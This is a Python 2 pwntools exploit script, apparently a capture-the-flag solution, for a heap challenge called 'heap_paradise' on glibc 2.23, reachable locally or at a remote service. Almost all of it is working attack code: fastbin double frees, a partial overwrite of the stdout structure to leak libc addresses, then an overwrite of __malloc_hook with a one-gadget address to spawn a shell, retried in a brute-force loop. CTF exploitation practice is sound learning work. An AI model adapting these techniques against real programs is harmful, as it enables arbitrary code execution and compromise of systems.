#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2020 yonoi

from pwn import *
context.arch = 'amd64'
#context.log_level = "debug"
context.terminal = ['tmux', 'split', '-h']

pwn_file = ("./heap_paradise")
elf = ELF(pwn_file, checksec=False)
#libc = ELF("./bc.so.6")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so", checksec=False)

if len(sys.argv) == 1:
    r = process(pwn_file)
    pid = r.pid
else:
    r = remote("pwn.it", 3333)
    pid = 0

def debug():
    gdb.attach(r, "brva 0xDE8")

def add(size, data):
    r.sendlineafter("Choice:", '1')
    r.sendlineafter("Size :", str(size))
    r.sendafter("Data :", data)

def dele(idx):
    r.sendlineafter("Choice:", '2')
    r.sendlineafter("Index :", str(idx))

"""
fake = p64(0) + p64(0x61)
add(0x38, fake) #0
add(0x28, 'a')  #1

add(0x58, 'b')  #2
add(0x58, 'c')  #3

dele(2)
dele(3)
dele(2)

add(0x58, '\x10')   #4
add(0x58, 'a')      #5
add(0x58, 'a')      #6

add(0x58, '\x00'*0x28 + p64(0x91))  #7

dele(1)
dele(7)

debug()

add(0x58, '\x00'*0x28+p64(0x91)+'\x20'+'\x16')
"""

r.close()
while True:
    try:
        r = process("./heap_paradise")
        add(0x68, '\x00'*0x58 + p64(0x71))  #0
        add(0x68, '\x00'*0x58 + p64(0x71))  #1
        add(0x68, '\x00'*0x18 + p64(0x51))  #2

        dele(2)
        dele(0)
        dele(2)

        add(0x68, '\x60')   #3
        add(0x68, 'a')      #4
        add(0x68, 'a')      #5
        add(0x68, p64(0)+p64(0x91)) #6

        dele(1)
        add(0x68, '\xdd'+'\xa5')

        dele(0)
        dele(6)
        dele(0)

        add(0x68, '\x00'*0x58 + p64(0x71) + '\x70') 
        add(0x68, 'a')      
        add(0x68, 'a')      
        add(0x68, '\x00\x00\x00' + 6 * p64(0) + p64(0xfbad1800) + p64(0) * 3 + '\x00')

        r.recv(0x40)
        a = u64(r.recv(8)) - 0x3c5600
        libc.address = a
        print hex(a)

        dele(0)
        dele(6)
        dele(0)

        add(0x68, p64(libc.sym['__malloc_hook'] - 0x23))
        add(0x68, 'a')
        add(0x68, 'a')
        add(0x68, '\x00'*0x13 + p64(a + 0xf02a4))
        print hex(a+0xf02a4)
        
        dele(0)
        dele(0)
        r.recv()
        r.sendline("echo emocat")
    except:
        print "Wrong"
        r.close()
        continue
    else:
        print "OK"
        break

r.interactive()
